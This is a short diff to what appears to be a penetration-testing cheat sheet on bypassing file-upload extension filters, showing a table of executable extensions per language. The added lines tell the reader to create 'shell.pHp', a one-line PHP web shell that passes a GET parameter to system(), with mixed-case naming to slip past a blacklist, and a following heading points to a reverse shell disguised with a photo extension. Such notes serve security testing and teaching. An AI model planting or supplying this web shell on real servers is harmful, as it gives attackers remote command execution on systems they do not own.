@@ -18,6 +18,11 @@ Blacklisting is a type of protection where certain strings of data, in many case
 | perl       | .pl, .pm, .cgi, .lib                                            |
 | jsp        | .jsp, .jspx, .jsw, .jsv, and .jspf                              |
 | Coldfusion | .cfm, .cfml, .cfc, .dbm                                         |
+
+Create **shell.pHp**
+```php
+<?php system($_GET['c']); ?>
+```
 ## Bypassing Whitelists
 Using a reverse shell with a photo extension
 ```console
